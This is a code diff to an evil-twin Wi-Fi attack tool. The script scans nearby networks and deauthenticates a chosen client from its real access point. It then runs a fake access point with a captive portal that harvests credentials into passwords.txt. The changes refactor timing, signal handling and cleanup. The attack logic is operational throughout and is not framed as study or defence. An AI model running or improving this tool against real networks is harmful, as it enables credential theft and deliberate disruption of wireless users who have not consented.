@@ -14,8 +14,27 @@ import evil_twin_framework.captive_portal as cp
 ONE_MINUTE_SCAN = 60
 
 
+def cleanup_and_exit():
+    """Properly cleanup and exit the program"""
+    print("\n[*] Cleaning up and exiting...")
+    
+    network.stop_sniffing()
+    dauth.stop_attack()
+    fake_ap.cleanup()
+    
+    print("[✓] Cleanup complete. Exiting...")
+    sys.exit(0)
+
+def signal_handler(sig, frame):
+    """Handle Ctrl+C"""
+    print("\n[!] Caught interrupt signal...")
+    cleanup_and_exit()
+
+
 def main():
-    # Select interface for monitoring/scanning/deauth
+    sigint = signal.signal(signal.SIGINT, signal_handler)
+    sigterm = signal.signal(signal.SIGTERM, signal_handler)
+
     iface = network.select_interface()
 
     # Set up monitor mode
@@ -29,18 +48,14 @@ def main():
         print(f"[ERROR] Failed to set up monitor mode: {e}")
         sys.exit(1)
 
-    # Start sniffing in background thread
     print("[*] Starting network monitoring...")
     sniff_thread = threading.Thread(target=network.start_sniff, args=(iface,), daemon=True)
     sniff_thread.start()
 
-    # Initial sniffing warm-up
-    warmup = 30  # Reduced from 60 for faster testing
-    print(f"[*] Gathering initial data for {warmup} seconds...")
+    print(f"[*] Gathering initial data for {ONE_MINUTE_SCAN} seconds...")
 
-    # Show progress
-    for i in range(warmup):
-        print(f"\r[*] Scanning: {i+1}/{warmup} seconds", end='', flush=True)
+    for i in range(ONE_MINUTE_SCAN):
+        print(f"\r[*] Scanning: {i+1}/{ONE_MINUTE_SCAN} seconds", end='', flush=True)
         time.sleep(1)
     print("\n")
 
@@ -59,12 +74,11 @@ def main():
 
             if choice == 'q':
                 cleanup_and_exit()
-
+                break
             if choice == 'r':
-                refresh = 30
-                print(f"\n[*] Refreshing for {refresh} seconds...")
-                for i in range(refresh):
-                    print(f"\r[*] Scanning: {i+1}/{refresh} seconds", end='', flush=True)
+                print(f"\n[*] Refreshing for {ONE_MINUTE_SCAN} seconds...")
+                for i in range(ONE_MINUTE_SCAN):
+                    print(f"\r[*] Scanning: {i+1}/{ONE_MINUTE_SCAN} seconds", end='', flush=True)
                     time.sleep(1)
                 print("\n")
                 continue
@@ -86,8 +100,8 @@ def main():
                             if wait == 'b':
                                 break
                             elif wait == 'w':
-                                print("[*] Waiting 10 seconds...")
-                                time.sleep(10)
+                                print("[*] Waiting 60 seconds...")
+                                time.sleep(ONE_MINUTE_SCAN)
                                 continue
                             continue
 
@@ -153,33 +167,31 @@ def main():
                                     # Give services time to initialize
                                     time.sleep(5)
 
+                                    print("\n[*] Evil Twin is active!")
+                                    print("[*] Captive portal waiting for credentials at 192.168.0.1")
+                                    print("[*] Captured credentials will be saved to: passwords.txt")
+
                                     # Perform deauth after AP and portal started
                                     if deauth_interface == ap_interface:
                                         print("\n[WARNING] Cannot deauth from wlan0 while AP is active on it")
                                         print("[!] Clients must disconnect naturally or be deauth'd manually")
                                         print("[!] Evil Twin is running and waiting for connections...")
                                     else:
-                                        duration = 60
-                                        print(f"\n[*] Deauthing client {client_mac} for {duration} seconds...")
+                                        print(f"\n[*] Deauthing client {client_mac} for {ONE_MINUTE_SCAN} seconds...")
                                         print(f"[*] Using {deauth_interface} for deauth attacks")
                                         print("[*] Client should reconnect to our fake AP on wlan0")
 
-                                        dauth.start_attack(client_mac, target_bssid, deauth_interface, duration)
+                                        dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
 
                                         # Wait for attack with progress
-                                        for i in range(duration):
+                                        for i in range(ONE_MINUTE_SCAN):
                                             if not dauth.is_attack_running():
                                                 break
-                                            print(f"\r[*] Deauth progress: {i+1}/{duration} seconds", end='', flush=True)
                                             time.sleep(1)
                                         print("\n")
 
+                                        dauth.stop_attack()
                                         print("[✓] Deauth completed!")
-
-                                    print("\n[*] Evil Twin is active!")
-                                    print("[*] Captive portal waiting for credentials at 192.168.0.1")
-                                    print("[*] Captured credentials will be saved to: passwords.txt")
-                                    print("\n[TIP] Connect a phone to test the captive portal")
 
                                     # Keep running until user stops
                                     input("\nPress Enter to stop Evil Twin and return to scanning...")
@@ -200,12 +212,13 @@ def main():
                                     next_action = input("\nWhat next? 'c' to continue scanning, 'q' to quit: ").strip().lower()
                                     if next_action == 'q':
                                         cleanup_and_exit()
+                                        break
                                 # If 'c' or anything else, continue scanning
             else:
                 print("Invalid choice. Please try again.")
 
     except KeyboardInterrupt:
-        signal_handler(None, None)
+        cleanup_and_exit()
     except Exception as e:
         print(f"\n[ERROR] Unexpected error: {e}")
         cleanup_and_exit()
